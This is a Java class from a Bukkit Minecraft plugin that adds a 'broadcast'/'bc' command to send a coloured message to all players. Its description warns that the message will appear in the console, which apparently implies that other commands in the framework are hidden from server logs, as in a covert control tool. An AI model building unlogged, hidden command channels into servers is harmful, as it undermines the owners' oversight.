package cc.americium.command.commands;

import cc.americium.Colors;
import cc.americium.command.Command;
import cc.americium.command.Context;
import cc.americium.command.Sender;
import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.entity.Player;

public class Broadcast implements Command {
    @Override
    public String[] getCommands() {
        return new String[]{"broadcast", "bc"};
    }

    @Override
    public String getDescription() {
        return "Broadcast a message to all players (will appear in console!).";
    }

    @Override
    public void execute(Player executor, Sender sender, Context context) {
        String[] args = context.getArgs();
        if (args.length == 0) {
            sender.sendMessage(Colors.Prefix + Colors.Failure + "bc <message...>");
            return;
        }

        String message = ChatColor.translateAlternateColorCodes('&', String.join(" ", args));
        Bukkit.getScheduler().scheduleSyncDelayedTask(context.getZ_(), () -> {
            Bukkit.broadcastMessage(message);
            sender.sendMessage(Colors.Prefix + Colors.Success + "Successfully broadcasted message '" + message + Colors.Success + "'!");
        });
    }
}
